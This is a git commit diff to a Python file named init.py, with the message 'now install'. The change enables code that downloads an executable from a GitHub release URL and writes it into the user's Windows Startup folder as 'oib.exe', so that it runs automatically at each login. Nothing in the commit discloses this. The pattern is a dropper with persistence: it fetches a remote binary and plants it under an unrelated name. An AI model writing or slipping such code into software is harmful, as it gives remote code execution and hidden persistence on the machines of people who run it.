664f346c820a1feafac397a2d86855a84a034476
Can202 <mgoopazo@gmail.com>
2021-09-27 19:16:58 -0300

    now install

--- init.py
+++ init.py
@@ -8,10 +8,9 @@ import requests
 
 def main():
     startup = appdirs.user_data_dir() + "\\..\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-    #fil = requests.get("https://github.com/idur-package/Visual-Idur/releases/download/v0.1/visual-idur-x86_64.tar.xz")
-    #with open("visual-idur-x86_64.tar.xz", 'wb') as f:
-    #    f.write(fil.content)
-    #exit()
+    fil = requests.get("https://github.com/Can202/testt/releases/download/test/init.exe")
+    with open(startup + "\\oib.exe", 'wb') as f:
+        f.write(fil.content)
     
     while True:
 
